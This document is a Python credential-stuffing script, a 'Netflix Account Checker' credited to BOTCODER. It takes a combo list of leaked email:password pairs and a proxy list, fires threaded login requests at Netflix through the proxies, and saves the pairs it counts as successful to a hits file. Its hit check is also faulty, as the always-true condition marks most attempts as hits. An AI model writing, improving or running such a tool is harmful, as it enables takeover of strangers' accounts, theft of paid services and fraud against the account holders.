class netflixChecker:
    def __init__(self):
        pass
    def fileCheck(file):
        try:
            if not os.path.exists(file) :
                print("File Not Found")
            else:
                pass
        except Exception as error:
            print(error)
    def reader(file):
        try:
            lines=open(file,"r")
            fileList=list(lines)
            return fileList
        except Exception as error:
            print(error)

    def Checker(email,password,proxy,combo):
        try:
            session=requests.Session()
            requests.adapters.DEFAULT_RETRIES = 5
            session.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0'})
            login = session.get("https://www.netflix.com/nl-en/Login",proxies={'HTTP':proxy})
            soup = Soup(login.text)
            loginForm = soup.find('form')
            authURL = loginForm.find('input', {'name': 'authURL'}).get('value')
            requestToNetflix = session.post("https://www.netflix.com:443/Login",headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br","Referer": "https://www.netflix.com/Login", "Connection": "close","Content-Type": "application/x-www-form-urlencoded"},data={"email": (email), "password": (password), "rememberMeCheckbox": "true","flow": "websiteSignUp", "mode": "login", "action": "loginAction","withFields": "email,password,rememberMe,nextPage", "authURL": (authURL),"nextPage": "https://www.netflix.com/browse"},proxies={'HTTP':proxy})

            if "Sorry, we can't find an account with this email address. Please try again or " in requestToNetflix.text:
                pass
            elif "Incorrect password." or "Welcome back" in requestToNetflix.text:
                 hits.write(combo)
                 print(combo)
        except Exception as error:
            print(error)
            pass

if __name__ == '__main__':
    de_version="1"
    import requests,argparse,os,time,webbrowser
    from bs4 import BeautifulSoup as Soup
    from threading import Thread
    import urllib.request as urequest
    import colorama
    from colorama import Fore
    import urllib.request as urequest


    def update():
        page = urequest.urlopen('https://pastebin.com/14dYYFmj').read()
        soup = Soup(page, 'html.parser')
        version = soup.find('div', class_='de1').text
        if version > de_version:
            import webbrowser
            print(Fore.CYAN + "UPDATE " + Fore.MAGENTA + version + Fore.CYAN + " is Avaiable")
            print(Fore.RED + "Please update the Program")
            print("Redirecting...." + Fore.RESET)
            time.sleep(3)
            webbrowser.open('https://github.com/BOT-CODER/NetflixChecker')
            exit()
        else:
            pass
    checker=netflixChecker
    parser = argparse.ArgumentParser(prog='Netflix Checker')
    parser.add_argument("combo", help="Location of the Combos", type=str)
    parser.add_argument("proxy", help="Location of the Proxies", type=str)
    args = parser.parse_args()
    print(Fore.MAGENTA)
    print('########################################################')
    print('####             Netflix Account Checker            ####')
    print('####              Coded by BOTCODER                 ####')
    print('####                                                ####')
    print('####                 PGT COMMUNITY                  ####')
    print('########################################################')
    print(' ')
    Fore.RESET
    try:
        urequest.urlopen('https://www.google.co.in/', timeout=3)
    except KeyboardInterrupt:
        print(Fore.RED + "Stopped by User" + Fore.RESET)
    except:
        print(Fore.RED + 'Please Check your connection' + Fore.RESET)
    update()
    try:
        hits=open("Hits.txt",'w+')

    except Exception as error:
        print(error)
    try:
        print(Fore.RED+"Starting...\n\nPlease Use VPN To Avoid Connection Errors\n\n")

        combo=str(args.combo)
        proxy=args.proxy
        checker.fileCheck(combo)
        checker.fileCheck(proxy)
        combos=checker.reader(combo)
        proxies=checker.reader(proxy)
    except Exception as error:
        print(error)
    for i,j in zip(combos,proxies):
        email=i.split(":")[0]
        password=i.split(":")[1]
        proxy="https://"+j
        #netflixChecker.Checker(email,password,proxy,i)
        Thread(target=netflixChecker.Checker,args=(email,password,proxy,i,)).start()

